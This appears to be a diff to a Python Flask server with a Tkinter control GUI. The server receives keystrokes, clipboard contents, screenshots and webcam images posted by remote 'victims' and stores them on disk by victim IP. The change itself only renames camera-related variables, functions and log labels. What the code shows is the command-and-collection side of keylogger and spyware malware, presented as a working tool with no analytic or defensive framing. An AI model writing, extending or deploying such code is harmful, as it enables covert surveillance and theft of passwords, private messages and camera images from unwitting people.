@@ -23,16 +23,16 @@ logger.setLevel(logging.INFO)
 keystrokes_file_path = 'saved_keystrokes.txt'
 clipboard_file_path = 'saved_clipboard.txt'
 screenshots_dir = 'screenshots'
-camera_captures_dir = 'camera_captures'
+camera_images_dir = 'camera_images'
 connected_ips_file_path = 'connected_ips.txt'
 
 os.makedirs(screenshots_dir, exist_ok=True)
-os.makedirs(camera_captures_dir, exist_ok=True)
+os.makedirs(camera_images_dir, exist_ok=True)
 
-# Flag for logging clipboard data, screenshot data, and camera captures
+# Flag for logging clipboard data, screenshot data, and camera images
 show_clipboard_in_logs = True
 show_screenshot_logs = True
-show_camera_captures_logs = True
+show_camera_logs = True
 
 connected_ips = set()
 
@@ -67,7 +67,7 @@ def handle_post():
         keyboard_data = data.get('keyboardData', '')
         clipboard_data = data.get('clipboardData', '')
         screenshot_base64 = data.get('screenshot', '')
-        camera_base64 = data.get('cameraCapture', '')
+        camera_image_base64 = data.get('cameraImage', '')
 
         victim_ip = request.remote_addr
 
@@ -89,10 +89,10 @@ def handle_post():
             if show_screenshot_logs:
                 logger.info(f"Screenshot saved from {victim_ip}")
 
-        if camera_base64:
-            save_camera_capture(camera_base64, victim_ip)
-            if show_camera_captures_logs:
-                logger.info(f"Camera capture saved from {victim_ip}")
+        if camera_image_base64:
+            save_camera_image(camera_image_base64, victim_ip)
+            if show_camera_logs:
+                logger.info(f"Camera image saved from {victim_ip}")
 
         return jsonify({'status': 'success', 'message': 'Data received and saved successfully'}), 200
 
@@ -116,11 +116,11 @@ def save_screenshot(base64_data, victim_ip):
     with open(file_path, 'wb') as file:
         file.write(image_data)
 
-def save_camera_capture(base64_data, victim_ip):
+def save_camera_image(base64_data, victim_ip):
     image_data = base64.b64decode(base64_data)
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-    file_name = f"{victim_ip}_camera_{timestamp}.png"
-    file_path = os.path.join(camera_captures_dir, file_name)
+    file_name = f"{victim_ip}_camera_image_{timestamp}.png"
+    file_path = os.path.join(camera_images_dir, file_name)
     with open(file_path, 'wb') as file:
         file.write(image_data)
 
@@ -199,9 +199,9 @@ class ServerGUI:
         self.screenshot_check.pack(pady=10)
         self.screenshot_check.state(['selected'] if show_screenshot_logs else ['!selected'])
 
-        self.camera_check = ttk.Checkbutton(self.control_frame, text="Show Camera Capture Logs", command=self.toggle_camera_capture_logging)
+        self.camera_check = ttk.Checkbutton(self.control_frame, text="Show Camera Logs", command=self.toggle_camera_logging)
         self.camera_check.pack(pady=10)
-        self.camera_check.state(['selected'] if show_camera_captures_logs else ['!selected'])
+        self.camera_check.state(['selected'] if show_camera_logs else ['!selected'])
 
         ttk.Label(self.control_frame, text="Theme:").pack(pady=5)
         self.theme_combo = ttk.Combobox(self.control_frame, values=["Light", "Dark"], state="readonly")
@@ -262,12 +262,11 @@ class ServerGUI:
         status = "enabled" if show_screenshot_logs else "disabled"
         self.log(f"Screenshot logging {status}.")
 
-    def toggle_camera_capture_logging(self):
-        global show_camera_captures_logs
-        show_camera_captures_logs = not show_camera_captures_logs
-        status = "enabled" if show_camera_captures_logs else "disabled"
-        self.log(f"Camera capture logging {status}.")
-        self.camera_check.state(['selected'] if show_camera_captures_logs else ['!selected'])
+    def toggle_camera_logging(self):
+        global show_camera_logs
+        show_camera_logs = not show_camera_logs
+        status = "enabled" if show_camera_logs else "disabled"
+        self.log(f"Camera logging {status}.")
 
     def log(self, message):
         self.gui_handler.emit(logging.LogRecord(name='root', level=logging.INFO, pathname='', lineno=0, msg=message, args=None, exc_info=None))
